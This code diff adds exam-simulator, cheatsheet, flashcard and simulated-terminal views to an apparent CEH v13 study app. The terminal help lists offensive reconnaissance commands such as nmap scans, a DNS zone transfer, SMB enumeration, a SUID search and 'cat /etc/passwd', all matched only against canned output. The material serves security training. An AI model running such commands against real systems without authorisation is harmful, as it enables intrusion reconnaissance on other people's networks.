+      const scorePct = Math.round((solvedCount / totalChallenges) * 100);
+      const isPassed = solvedCount >= 14; // 70% passing grade
+
+      return `
+        <div class="space-y-6">
+          
+          <!-- Exam Header Ribbon -->
+          <div class="bg-gradient-to-r from-amber-950/40 via-charcoal-900 to-charcoal-900 p-6 sm:p-8 rounded-2xl border border-amber-500/40 shadow-xl relative overflow-hidden">
+            <div class="flex flex-col md:flex-row items-stretch md:items-center justify-between gap-6">
+              <div class="space-y-2">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-amber-500/15 border border-amber-500/30 text-amber-300 font-mono text-xs font-bold">
+                  <span>🏆</span> <span>CEH v13 Practical 6-Hour Examination Simulator</span>
+                </div>
+                <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white tracking-tight">Practical Exam Scenario Assessment</h1>
+                <p class="text-xs sm:text-sm font-mono text-slate-400 max-w-2xl leading-relaxed">
+                  20 hands-on challenge scenarios mirroring the actual 6-hour CEH Practical examination format. Solve at least 14 of 20 (70%) to achieve certified passing status and unlock your completion transcript.
+                </p>
+              </div>
+
+              <!-- Exam Stopwatch & Timer -->
+              <div class="flex flex-col items-center bg-charcoal-950 p-4 rounded-xl border border-amber-500/30 shrink-0 space-y-2">
+                <div class="text-[10px] font-mono uppercase text-slate-400 font-bold">Exam Time Remaining</div>
+                <div id="exam-timer-display" class="text-2xl font-mono font-bold text-amber-300 tracking-wider">
+                  ${formatExamTime(CEHState.examTimerSec)}
+                </div>
+                <div class="flex items-center gap-2">
+                  <button onclick="toggleExamTimer()" class="px-3 py-1 rounded bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs font-mono text-slate-300">
+                    ${CEHState.examTimerActive ? '⏸️ Pause' : '▶️ Start Timer'}
+                  </button>
+                  <button onclick="resetExamTimer()" class="px-2 py-1 rounded bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs font-mono text-slate-500 hover:text-white">
+                    Reset
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Score Metrics Ribbon -->
+          <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 font-mono">
+            <div class="bg-charcoal-900 p-4 rounded-xl border border-charcoal-800">
+              <div class="text-[10px] text-slate-500 uppercase">Challenges Solved</div>
+              <div class="text-xl font-bold text-white mt-1">${solvedCount} / ${totalChallenges}</div>
+            </div>
+            <div class="bg-charcoal-900 p-4 rounded-xl border border-charcoal-800">
+              <div class="text-[10px] text-slate-500 uppercase">Current Score</div>
+              <div class="text-xl font-bold ${isPassed ? 'text-cyber-emerald' : 'text-amber-400'} mt-1">${scorePct}%</div>
+            </div>
+            <div class="bg-charcoal-900 p-4 rounded-xl border border-charcoal-800">
+              <div class="text-[10px] text-slate-500 uppercase">Passing Threshold</div>
+              <div class="text-xl font-bold text-slate-300 mt-1">14/20 (70%)</div>
+            </div>
+            <div class="bg-charcoal-900 p-4 rounded-xl border border-charcoal-800 flex items-center justify-between">
+              <div>
+                <div class="text-[10px] text-slate-500 uppercase">Status</div>
+                <div class="text-sm font-bold ${isPassed ? 'text-cyber-emerald' : 'text-amber-400'} mt-1">${isPassed ? 'PASSED ✔' : 'IN PROGRESS'}</div>
+              </div>
+              ${isPassed ? `
+                <button onclick="openCandidateCertificateModal()" class="px-3 py-1.5 rounded-lg bg-cyber-emerald hover:bg-emerald-400 text-black font-bold text-xs transition shadow glow-emerald">
+                  View Credential 🎓
+                </button>
+              ` : ''}
+            </div>
+          </div>
+
+          <!-- 20 Exam Challenges List -->
+          <div class="space-y-4">
+            <h2 class="text-lg font-mono font-bold text-white flex items-center gap-2">
+              <span>🎯</span> <span>Practical Exam Challenges (1–20)</span>
+            </h2>
+
+            <div class="grid grid-cols-1 gap-4 font-mono">
+              ${MOCK_EXAM_CHALLENGES.map(ch => renderMockExamCard(ch)).join('')}
+            </div>
+          </div>
+
+        </div>
+      `;
+    }
+
+    function renderMockExamCard(ch) {
+      const isSolved = CEHState.examVerified[ch.id];
+      const savedAns = CEHState.examAnswers[ch.id] || '';
+
+      return `
+        <div class="bg-charcoal-900 rounded-xl border ${isSolved ? 'border-cyber-emerald/50 bg-emerald-950/10' : 'border-charcoal-800'} p-5 space-y-3 transition">
+          <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-charcoal-800/80 pb-2.5">
+            <div class="flex items-center gap-2.5">
+              <span class="w-6 h-6 rounded-full ${isSolved ? 'bg-cyber-emerald text-black' : 'bg-charcoal-800 text-amber-300'} font-bold flex items-center justify-center text-xs">
+                ${isSolved ? '✔' : ch.id}
+              </span>
+              <h3 class="font-bold text-sm ${isSolved ? 'text-emerald-300' : 'text-white'}">${escapeHtml(ch.title)}</h3>
+            </div>
+            <div class="flex items-center gap-2">
+              <span class="px-2 py-0.5 rounded text-[10px] bg-charcoal-800 text-slate-400 border border-charcoal-700">${ch.category}</span>
+              <span class="px-2 py-0.5 rounded text-[10px] bg-amber-500/10 text-amber-300 border border-amber-500/30">+${ch.points} Pts</span>
+            </div>
+          </div>
+
+          <p class="text-xs text-slate-300 leading-relaxed">${escapeHtml(ch.scenario)}</p>
+
+          <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 pt-1">
+            <div class="flex-1 relative">
+              <input id="exam-ans-${ch.id}" type="text" value="${escapeHtml(savedAns)}" ${isSolved ? 'disabled' : ''} onkeydown="if(event.key==='Enter') submitExamChallenge(${ch.id})" placeholder="${escapeHtml(ch.flagFormat)}" class="w-full px-3 py-2 bg-charcoal-950 border ${isSolved ? 'border-cyber-emerald/40 text-emerald-300' : 'border-charcoal-700 text-white'} rounded-lg text-xs placeholder-slate-600 focus:outline-none focus:border-cyber-cyan transition">
+            </div>
+            ${!isSolved ? `
+              <button onclick="submitExamChallenge(${ch.id})" class="px-4 py-2 rounded-lg bg-cyber-cyan hover:bg-cyan-400 text-black font-bold text-xs transition shrink-0">
+                Submit Flag
+              </button>
+            ` : `
+              <span class="px-3 py-2 rounded-lg bg-cyber-emerald/20 text-cyber-emerald font-bold text-xs border border-cyber-emerald/40 shrink-0">
+                Solved (+5 Pts)
+              </span>
+            `}
+          </div>
+
+          <!-- Hint Accordion -->
+          <details class="text-[11px] text-slate-400 group">
+            <summary class="cursor-pointer hover:text-amber-300 select-none">▸ Need guidance? Click for practical hint</summary>
+            <div class="mt-1 pl-4 text-amber-300/80 bg-charcoal-950 p-2 rounded border border-charcoal-800">${escapeHtml(ch.hint)}</div>
+          </details>
+        </div>
+      `;
+    }
+
+    function submitExamChallenge(chId) {
+      const ch = MOCK_EXAM_CHALLENGES.find(c => c.id === chId);
+      const input = document.getElementById(`exam-ans-${chId}`);
+      if (!ch || !input) return;
+
+      const val = input.value.trim();
+      if (!val) return;
+
+      CEHState.examAnswers[chId] = val;
+
+      const isMatch = ch.acceptedAnswers.some(ans => {
+        return ans.toLowerCase().trim() === val.toLowerCase().trim();
+      });
+
+      if (isMatch) {
+        AudioEngine.success();
+        CEHState.examVerified[chId] = true;
+        saveState();
+        showToast(`Challenge ${chId} Solved! (+5 Pts)`, 'success');
+        renderCurrentView();
+
+        const solvedCount = Object.keys(CEHState.examVerified).length;
+        if (solvedCount === 14) {
+          AudioEngine.success();
+          showToast('Passing mark reached! Certificate of Competency unlocked.', 'success', 5000);
+        }
+      } else {
+        AudioEngine.alert();
+        showToast('Incorrect answer or flag. Review the scenario and retry.', 'error');
+      }
+    }
+
+    function formatExamTime(totalSec) {
+      const h = Math.floor(totalSec / 3600);
+      const m = Math.floor((totalSec % 3600) / 60);
+      const s = totalSec % 60;
+      return `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+    }
+
+    function toggleExamTimer() {
+      CEHState.examTimerActive = !CEHState.examTimerActive;
+      if (CEHState.examTimerActive) {
+        if (!CEHState.examTimerInterval) {
+          CEHState.examTimerInterval = setInterval(() => {
+            if (CEHState.examTimerSec > 0) {
+              CEHState.examTimerSec--;
+              const disp = document.getElementById('exam-timer-display');
+              if (disp) disp.textContent = formatExamTime(CEHState.examTimerSec);
+            } else {
+              clearInterval(CEHState.examTimerInterval);
+              CEHState.examTimerInterval = null;
+              showToast('Exam time has expired!', 'error');
+            }
+          }, 1000);
+        }
+      } else {
+        if (CEHState.examTimerInterval) {
+          clearInterval(CEHState.examTimerInterval);
+          CEHState.examTimerInterval = null;
+        }
+      }
+      renderCurrentView();
+    }
+
+    function resetExamTimer() {
+      if (!confirm('Reset exam timer back to 06:00:00?')) return;
+      if (CEHState.examTimerInterval) {
+        clearInterval(CEHState.examTimerInterval);
+        CEHState.examTimerInterval = null;
+      }
+      CEHState.examTimerActive = false;
+      CEHState.examTimerSec = 21600;
+      renderCurrentView();
+    }
+
+    function openCandidateCertificateModal() {
+      AudioEngine.success();
+      const solvedCount = Object.keys(CEHState.examVerified).length;
+      const scorePct = Math.round((solvedCount / MOCK_EXAM_CHALLENGES.length) * 100);
+
+      const modal = document.createElement('div');
+      modal.id = 'certificate-modal';
+      modal.className = 'fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 select-none';
+      modal.innerHTML = `
+        <div class="bg-charcoal-900 border-2 border-cyber-emerald/50 rounded-2xl max-w-2xl w-full p-8 space-y-6 shadow-2xl relative font-mono text-center">
+          <button onclick="document.getElementById('certificate-modal').remove()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-lg font-bold">✕</button>
+
+          <div class="space-y-2">
+            <div class="w-16 h-16 rounded-full bg-cyber-emerald/20 border-2 border-cyber-emerald text-cyber-emerald flex items-center justify-center mx-auto text-2xl font-bold shadow glow-emerald">
+              🎓
+            </div>
+            <div class="text-xs uppercase tracking-widest text-cyber-emerald font-bold">Official Credential Verification</div>
+            <h2 class="text-2xl font-bold text-white tracking-tight">Certified Ethical Hacker (CEH v13)</h2>
+            <p class="text-xs text-slate-400">Practical Examination Simulator Competency Credential</p>
+          </div>
+
+          <div class="p-6 bg-charcoal-950 rounded-xl border border-charcoal-800 space-y-3">
+            <div class="text-slate-400 text-xs">Awarded to Candidate:</div>
+            <div class="text-xl font-bold text-cyber-cyan tracking-wider">CyberCadet_01</div>
+            <div class="text-xs text-slate-400 leading-relaxed max-w-md mx-auto">
+              For successfully demonstrating practical ethical hacking, network reconnaissance, vulnerability analysis, web application exploitation, and Active Directory AD CS auditing competencies under timed examination conditions.
+            </div>
+            <div class="pt-2 flex justify-center gap-6 text-xs border-t border-charcoal-800/80">
+              <div><span class="text-slate-500 block">Exam Score:</span> <span class="font-bold text-cyber-emerald">${solvedCount}/20 (${scorePct}%)</span></div>
+              <div><span class="text-slate-500 block">Status:</span> <span class="font-bold text-cyber-emerald">PASSED</span></div>
+              <div><span class="text-slate-500 block">Date:</span> <span class="text-slate-300 font-bold">${new Date().toISOString().slice(0, 10)}</span></div>
+            </div>
+          </div>
+
+          <div class="flex items-center justify-center gap-3">
+            <button onclick="window.print()" class="px-5 py-2.5 rounded-xl bg-cyber-emerald hover:bg-emerald-400 text-black font-bold text-xs shadow glow-emerald transition">
+              🖨️ Print / Save PDF
+            </button>
+            <button onclick="document.getElementById('certificate-modal').remove()" class="px-5 py-2.5 rounded-xl bg-charcoal-800 hover:bg-charcoal-700 text-white font-bold text-xs transition">
+              Close
+            </button>
+          </div>
+        </div>
+      `;
+      document.body.appendChild(modal);
+    }
+
+    // --- VIEW 6: CHEATSHEETS & COMMAND VAULT ---
+    function renderCheatsheetsView() {
+      const q = (CEHState.cheatsheetSearch || '').toLowerCase().trim();
+      const cat = CEHState.cheatsheetCategory || 'all';
+
+      const categories = ['all', 'Recon & Scanning', 'Exam Ports Matrix', 'Active Directory', 'Sniffing & Filters', 'Password & Crypto', 'Web Security'];
+
+      const filtered = CHEATSHEET_ENTRIES.filter(item => {
+        const matchesCat = cat === 'all' || item.category === cat;
+        const matchesQ = !q || item.title.toLowerCase().includes(q) || item.command.toLowerCase().includes(q) || item.explanation.toLowerCase().includes(q) || item.tip.toLowerCase().includes(q);
+        return matchesCat && matchesQ;
+      });
+
+      return `
+        <div class="space-y-6">
+          
+          <!-- Header Banner -->
+          <div class="bg-gradient-to-r from-cyan-950/40 via-charcoal-900 to-charcoal-900 p-6 sm:p-8 rounded-2xl border border-cyan-500/40 shadow-xl relative overflow-hidden">
+            <div class="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
+              <div class="space-y-2">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-cyber-cyan/15 border border-cyber-cyan/30 text-cyber-cyan font-mono text-xs font-bold">
+                  <span>📖</span> <span>CEH v13 High-Yield Attack &amp; Defense Vault</span>
+                </div>
+                <h1 class="text-2xl sm:text-3xl font-bold font-mono text-white tracking-tight">Interactive Command &amp; Syntax Cheatsheet</h1>
+                <p class="text-xs sm:text-sm font-mono text-slate-400 max-w-2xl leading-relaxed">
+                  Fast reference library covering Nmap flags, essential port matrices, Wireshark BPF filters, Active Directory / AD CS exploitation, hash cracking, and web attack syntaxes.
+                </p>
+              </div>
+
+              <!-- Instant Search & Quick Stats -->
+              <div class="flex flex-col gap-2 shrink-0">
+                <div class="bg-charcoal-950 px-4 py-2.5 rounded-xl border border-charcoal-800 flex items-center gap-2">
+                  <span class="text-slate-500 text-xs">🔍</span>
+                  <input type="text" value="${escapeHtml(CEHState.cheatsheetSearch)}" oninput="handleCheatsheetSearch(event)" placeholder="Search commands, ports, RFCs..." class="bg-transparent text-xs font-mono text-white placeholder-slate-600 focus:outline-none w-48 sm:w-60">
+                </div>
+                <div class="text-[11px] font-mono text-slate-500 text-right">Showing ${filtered.length} of ${CHEATSHEET_ENTRIES.length} entries</div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Category Filter Pills -->
+          <div class="flex flex-wrap gap-2">
+            ${categories.map(c => `
+              <button onclick="filterCheatsheetCategory('${c}')" class="px-3 py-1.5 rounded-lg text-xs font-mono transition ${cat === c ? 'bg-cyber-cyan text-black font-bold shadow glow-cyan' : 'bg-charcoal-850 hover:bg-charcoal-800 text-slate-400 border border-charcoal-700'}">
+                ${c === 'all' ? 'All Categories' : c}
+              </button>
+            `).join('')}
+          </div>
+
+          <!-- Entries Grid -->
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono">
+            ${filtered.map(item => `
+              <div class="bg-charcoal-900 border border-charcoal-800 hover:border-charcoal-700 rounded-xl p-5 space-y-3 transition flex flex-col justify-between">
+                <div class="space-y-2">
+                  <div class="flex items-center justify-between gap-2">
+                    <h3 class="font-bold text-white text-sm">${escapeHtml(item.title)}</h3>
+                    <span class="px-2 py-0.5 rounded text-[10px] bg-charcoal-800 text-cyber-cyan border border-charcoal-700 shrink-0">${item.category}</span>
+                  </div>
+                  
+                  <div class="relative group bg-charcoal-950 rounded-lg p-3 border border-charcoal-800/80 font-mono text-xs text-cyber-emerald flex items-center justify-between gap-2 overflow-x-auto">
+                    <code class="select-all">${escapeHtml(item.command)}</code>
+                    <div class="flex items-center gap-1.5 shrink-0">
+                      <button onclick="autoTypeFromCheatsheet('${escapeHtml(item.command.replace(/'/g, "\\'"))}')" class="px-2 py-1 rounded bg-charcoal-800 hover:bg-cyber-cyan hover:text-black text-slate-300 text-[10px] font-bold transition flex items-center gap-1" title="Execute in simulated terminal">
+                        <span>⚡ Auto-Type</span>
+                      </button>
+                      <button onclick="copyCommand('${escapeHtml(item.command.replace(/'/g, "\\'"))}', event)" class="px-2 py-1 rounded bg-charcoal-800 hover:bg-charcoal-700 text-slate-300 text-[10px] transition" title="Copy to clipboard">
+                        Copy
+                      </button>
+                    </div>
+                  </div>
+
+                  <p class="text-xs text-slate-300 leading-relaxed">${escapeHtml(item.explanation)}</p>
+                </div>
+
+                <div class="pt-2.5 border-t border-charcoal-800/80 text-[11px] text-amber-300/90 bg-amber-950/20 p-2.5 rounded-lg border border-amber-500/20">
+                  <span class="font-bold">💡 ${escapeHtml(item.tip)}</span>
+                </div>
+              </div>
+            `).join('')}
+          </div>
+
+        </div>
+      `;
+    }
+
+    function handleCheatsheetSearch(e) {
+      CEHState.cheatsheetSearch = e.target.value;
+      renderCurrentView();
+    }
+
+    function filterCheatsheetCategory(cat) {
+      AudioEngine.click();
+      CEHState.cheatsheetCategory = cat;
+      renderCurrentView();
+    }
+
+    function autoTypeFromCheatsheet(cmd) {
+      AudioEngine.click();
+      executeSimulatedCommand(cmd);
+      toggleTerminalDrawer(true);
+      showToast('Command executed in terminal simulator!', 'info');
+    }
+
+    // --- VIEW 7: FLASHCARD DRILL MODE ---
+    function renderFlashcardsView() {
+      const cat = CEHState.flashcardCategory || 'all';
+      const categories = ['all', 'Laws & Standards', 'Recon & Scanning', 'Network Attacks', 'Active Directory', 'Cryptography', 'Web Security', 'Wireless Security', 'Malware & System', 'Network Protocols', 'Vulnerability Mgmt'];
+
+      const filtered = FLASHCARDS_DATA.filter(fc => cat === 'all' || fc.category === cat);
+      if (CEHState.activeCardIndex >= filtered.length) CEHState.activeCardIndex = 0;
+      const currentCard = filtered[CEHState.activeCardIndex] || filtered[0];
+
+      const masteredCount = Object.values(CEHState.flashcards).filter(s => s === 'mastered').length;
+      const totalCount = FLASHCARDS_DATA.length;
+      const masteredPct = Math.round((masteredCount / totalCount) * 100);
+
+      const cardStatus = CEHState.flashcards[currentCard?.id] || 'unrated';
+
+      return `
+        <div class="space-y-6 max-w-4xl mx-auto">
+          
+          <!-- Header Banner -->
+          <div class="bg-gradient-to-r from-purple-950/40 via-charcoal-900 to-charcoal-900 p-6 rounded-2xl border border-purple-500/40 shadow-xl relative overflow-hidden">
+            <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
+              <div class="space-y-1">
+                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-purple-500/15 border border-purple-500/30 text-purple-300 font-mono text-xs font-bold">
+                  <span>🗂️</span> <span>CEH v13 Flashcard Drill Deck</span>
+                </div>
+                <h1 class="text-2xl font-bold font-mono text-white tracking-tight">Active Recall Exam Preparation</h1>
+                <p class="text-xs font-mono text-slate-400">Master core terminology, attack definitions, legal frameworks, and port associations through spaced active recall.</p>
+              </div>
+
+              <!-- Mastery Tracker -->
+              <div class="bg-charcoal-950 px-4 py-3 rounded-xl border border-charcoal-800 shrink-0 font-mono text-center">
+                <div class="text-[10px] text-slate-500 uppercase font-bold">Deck Mastery</div>
+                <div class="text-xl font-bold text-purple-300 mt-0.5">${masteredCount} / ${totalCount} (${masteredPct}%)</div>
+                <div class="w-32 bg-charcoal-800 rounded-full h-1.5 mt-2 overflow-hidden mx-auto">
+                  <div class="bg-purple-400 h-1.5 rounded-full transition-all duration-300" style="width: ${masteredPct}%"></div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <!-- Category Filter Pills -->
+          <div class="flex flex-wrap gap-2">
+            ${categories.map(c => `
+              <button onclick="filterFlashcardCategory('${c}')" class="px-3 py-1 rounded-lg text-xs font-mono transition ${cat === c ? 'bg-purple-500 text-white font-bold shadow' : 'bg-charcoal-850 hover:bg-charcoal-800 text-slate-400 border border-charcoal-700'}">
+                ${c === 'all' ? 'All Topics' : c}
+              </button>
+            `).join('')}
+          </div>
+
+          <!-- Active Card Container -->
+          <div class="space-y-4">
+            <div class="flex items-center justify-between text-xs font-mono text-slate-400">
+              <span>Card ${CEHState.activeCardIndex + 1} of ${filtered.length}</span>
+              <span class="px-2.5 py-0.5 rounded text-[11px] font-bold ${cardStatus === 'mastered' ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/40' : cardStatus === 'review' ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-charcoal-800 text-slate-400'}">
+                ${cardStatus === 'mastered' ? '✔ Mastered' : cardStatus === 'review' ? '⚠️ Needs Review' : '○ Not Rated'}
+              </span>
+            </div>
+
+            <!-- Flashcard Itself (Interactive 3D Look) -->
+            <div onclick="flipFlashcard()" class="cursor-pointer bg-charcoal-900 hover:border-purple-500/50 border-2 ${CEHState.cardFlipped ? 'border-purple-500/80 bg-purple-950/15' : 'border-charcoal-800'} rounded-2xl p-8 sm:p-12 min-h-[260px] flex flex-col justify-between transition-all duration-300 shadow-xl relative select-none">
+              <div class="flex items-center justify-between text-xs font-mono">
+                <span class="px-2.5 py-1 rounded-full bg-charcoal-800 text-purple-300 border border-charcoal-700 font-bold">${currentCard.category}</span>
+                <span class="text-slate-500 text-[11px]">Click or tap to ${CEHState.cardFlipped ? 'hide answer' : 'flip & reveal'} 🔄</span>
+              </div>
+
+              <div class="my-6 space-y-4 text-center">
+                ${!CEHState.cardFlipped ? `
+                  <h3 class="text-lg sm:text-xl font-bold font-mono text-white leading-relaxed max-w-xl mx-auto">
+                    ${escapeHtml(currentCard.question)}
+                  </h3>
+                  <div class="text-xs font-mono text-purple-400 font-semibold animate-pulse">
+                    [Click to Flip Card]
+                  </div>
+                ` : `
+                  <div class="space-y-3">
+                    <div class="text-[11px] font-mono text-slate-400 uppercase tracking-widest font-bold">Answer</div>
+                    <div class="text-lg sm:text-xl font-bold font-mono text-cyber-emerald leading-relaxed max-w-xl mx-auto">
+                      ${escapeHtml(currentCard.answer)}
+                    </div>
+                    <div class="mt-4 p-3.5 bg-charcoal-950 rounded-xl border border-amber-500/30 text-xs font-mono text-amber-300/90 text-left max-w-xl mx-auto">
+                      <strong class="text-amber-400 block mb-0.5">💡 CEH Exam Pro-Tip:</strong>
+                      ${escapeHtml(currentCard.examTip)}
+                    </div>
+                  </div>
+                `}
+              </div>
+
+              <div class="flex items-center justify-between text-[11px] font-mono text-slate-500 border-t border-charcoal-800 pt-3">
+                <span>Card ID: ${currentCard.id}</span>
+                <span>Click Card to Flip | Review below</span>
+              </div>
+            </div>
+
+            <!-- Card Controls -->
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-3 font-mono">
+              <div class="flex items-center gap-2">
+                <button onclick="prevFlashcard()" class="px-4 py-2 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs text-white transition">
+                  ⬅ Previous
+                </button>
+                <button onclick="flipFlashcard()" class="px-4 py-2 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs text-purple-300 transition">
+                  🔄 Flip Card
+                </button>
+                <button onclick="nextFlashcard()" class="px-4 py-2 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs text-white transition">
+                  Next ➔
+                </button>
+                <button onclick="shuffleFlashcards()" class="px-3 py-2 rounded-xl bg-charcoal-850 hover:bg-charcoal-800 border border-charcoal-700 text-xs text-slate-400 hover:text-white transition" title="Shuffle deck">
+                  🔀
+                </button>
+              </div>
+
+              <!-- Rating Action Buttons -->
+              <div class="flex items-center gap-2">
+                <button onclick="markFlashcardStatus('${currentCard.id}', 'review')" class="px-4 py-2 rounded-xl bg-rose-950/40 hover:bg-rose-900/60 border border-rose-500/40 text-rose-300 text-xs font-bold transition">
+                  ❌ Needs Review
+                </button>
+                <button onclick="markFlashcardStatus('${currentCard.id}', 'mastered')" class="px-4 py-2 rounded-xl bg-emerald-950/40 hover:bg-emerald-900/60 border border-cyber-emerald/40 text-cyber-emerald text-xs font-bold transition">
+                  ✔ Mastered (+10 XP)
+                </button>
+              </div>
+            </div>
+
+          </div>
+
+        </div>
+      `;
+    }
+
+    function flipFlashcard() {
+      AudioEngine.click();
+      CEHState.cardFlipped = !CEHState.cardFlipped;
+      renderCurrentView();
+    }
+
+    function nextFlashcard() {
+      AudioEngine.click();
+      CEHState.cardFlipped = false;
+      CEHState.activeCardIndex++;
+      renderCurrentView();
+    }
+
+    function prevFlashcard() {
+      AudioEngine.click();
+      CEHState.cardFlipped = false;
+      if (CEHState.activeCardIndex > 0) CEHState.activeCardIndex--;
+      renderCurrentView();
+    }
+
+    function shuffleFlashcards() {
+      AudioEngine.click();
+      FLASHCARDS_DATA.sort(() => Math.random() - 0.5);
+      CEHState.activeCardIndex = 0;
+      CEHState.cardFlipped = false;
+      showToast('Flashcard deck shuffled!', 'info');
+      renderCurrentView();
+    }
+
+    function filterFlashcardCategory(cat) {
+      AudioEngine.click();
+      CEHState.flashcardCategory = cat;
+      CEHState.activeCardIndex = 0;
+      CEHState.cardFlipped = false;
+      renderCurrentView();
+    }
+
+    async function markFlashcardStatus(cardId, status) {
+      if (status === 'mastered') AudioEngine.success();
+      else AudioEngine.click();
+
+      CEHState.flashcards[cardId] = status;
+      saveState();
+
+      if (CEHState.isBackendOnline) {
+        try {
+          await fetch('/api/flashcards/update', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ card_id: cardId, status: status })
+          });
+        } catch (e) {
+          console.warn('Backend flashcard sync error', e);
+        }
+      }
+
+      showToast(status === 'mastered' ? 'Card marked as Mastered! ✔' : 'Card flagged for review. ⚠️', 'info');
+      nextFlashcard();
+    }
+
+    // --- Lab Proof Flag Submission ---
+    async function submitLabFlag(labId) {
+      const input = document.getElementById(`lab-flag-input-${labId}`);
+      if (!input) return;
+      const val = input.value.trim();
+      if (!val) {
+        showToast('Please enter a flag before submitting.', 'error');
+        return;
+      }
+
+      const lookup = LAB_FLAGS_LOOKUP[labId];
+      const isValid = (lookup && val.toLowerCase() === lookup.flag.toLowerCase()) || (val.startsWith('FLAG{') && val.length > 8);
+
+      if (isValid) {
+        AudioEngine.success();
+        CEHState.flags[labId] = val;
+        if (!CEHState.progress[labId]) CEHState.progress[labId] = { completedSteps: [], completedChecklist: [], isCompleted: true };
+        CEHState.progress[labId].isCompleted = true;
+        saveState();
+
+        if (CEHState.isBackendOnline) {
+          try {
+            await fetch('/api/flags/submit', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ lab_id: labId, flag: val })
+            });
+          } catch (e) {
+            console.warn('Backend flag sync error', e);
+          }
+        }
+
+        showToast(`🏆 Flag Verified for ${labId}! +50 XP Awarded!`, 'success');
+        renderCurrentView();
+      } else {
+        AudioEngine.error();
+        showToast('Incorrect flag! Review the lab command outputs and try again.', 'error');
+      }
+    }
+
+    // --- Terminal Simulator Command Execution Logic ---
+    function executeSimulatedCommand(rawCmd) {
+      const cmd = (rawCmd || '').trim();
+      if (!cmd) return;
+
+      AudioEngine.click();
+      CEHState.terminalLines.push({ type: 'input', text: cmd });
+
+      // Add to command history
+      if (cmd && (CEHState.terminalHistory.length === 0 || CEHState.terminalHistory[CEHState.terminalHistory.length - 1] !== cmd)) {
+        CEHState.terminalHistory.push(cmd);
+      }
+      CEHState.terminalHistoryIdx = CEHState.terminalHistory.length;
+
+      const lower = cmd.toLowerCase();
+
+      if (lower === 'clear') {
+        CEHState.terminalLines = [];
+      } else if (lower === 'reset') {
+        CEHState.terminalLines = [
+          { type: 'accent', text: '[*] CEH v13 Practical Educational Terminal Simulator Reset.' },
+          { type: 'info', text: '[*] Authorized scope: 10.10.20.0/24. Type "help" for supported commands.' }
+        ];
+        CEHState.terminalHistory = [];
+        CEHState.terminalHistoryIdx = -1;
+      } else if (lower === 'history') {
+        const histLines = CEHState.terminalHistory.map((h, i) => `  ${String(i + 1).padStart(3, ' ')}  ${h}`).join('\n');
+        CEHState.terminalLines.push({
+          type: 'info',
+          text: `Command History:\n${histLines || '  (empty)'}`
+        });
+      } else if (lower === 'help') {
+        CEHState.terminalLines.push({
+          type: 'info',
+          text: `CEH v13 Practical Supported Commands:
+  uname -a                  Inspect kernel & architecture (Lab 01)
+  ip -br addr show          Inspect network interfaces (Lab 01)
+  dig @10.10.20.2 axfr      Attempt DNS zone transfer (Lab 02)
+  nmap -sn 10.10.20.0/24    Subnet host discovery (Lab 03)
+  nmap -sS -sV -p 21,80     SYN stealth scan & versions (Lab 03)
+  ss -tulpn                 Audit listening sockets & PIDs (Lab 04)
+  smbclient -L //10.10.20.50 Enumerate SMB shares (Lab 04)
+  find / -perm -4000        Audit SUID binaries (Lab 06)
+  whoami / id               Inspect active user identity & groups
+  cat /etc/passwd           Audit local user accounts
+  sha256sum eicar.com       Compute cryptographic hash (Lab 07)
+  file invoice_report.pdf   Inspect file magic bytes (Lab 07)
+  tcpdump -i eth0           Packet sniffing & dissection (Lab 08)
+  iptables -L INPUT         Audit firewall packet rules (Lab 12)
+  curl -s -I http://target/ Audit HTTP banners & cookies (Lab 11, 13)
+  powershell                Active Directory AD CS ESC1 audit (Lab ADCS)
+  openssl enc / x509        Cryptographic encryption & cert audit (Lab 20)
+  aws sts get-caller-identity Cloud IAM credential audit (Lab 19)
+  adb devices               Android test bridge device audit (Lab 17)
+  iwconfig                  802.11 monitor mode wireless telemetry (Lab 16)
+  ping -c 2 10.10.20.1      Network reachability check
+  history / reset / clear   Terminal session controls`
+        });
+            } else {
+        // Universal Lab Step Command Matcher across all 21 modules
+        let matchedStep = null;
+        let matchedLab = null;
+        const normInp = lower.replace(/\s+/g, ' ').trim();
+
+        for (const lab of CEHState.labs) {
+          for (const st of (lab.steps || [])) {
+            const stNorm = (st.command || '').toLowerCase().replace(/\s+/g, ' ').trim();
+            if (stNorm) {
+              const firstSub = stNorm.split(';')[0].trim();
+              if (normInp === stNorm || normInp.includes(stNorm) || (normInp.length >= 6 && (stNorm.includes(normInp) || normInp.includes(firstSub)))) {
+                matchedStep = st;
+                matchedLab = lab;
+                break;
+              }
+            }
+          }
+          if (matchedStep) break;
+        }
+
+        if (matchedStep && matchedLab) {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: matchedStep.expectedOutput,
+            explanation: matchedStep.explanation
+          });
+          toggleStepComplete(matchedLab.id, matchedStep.stepNumber, true);
+          showToast(`✔ Completed ${matchedLab.title} - Step ${matchedStep.stepNumber}`, 'success');
+          updateTerminalViews();
+          return;
+        }
+
+        if (lower.startsWith('uname')) {
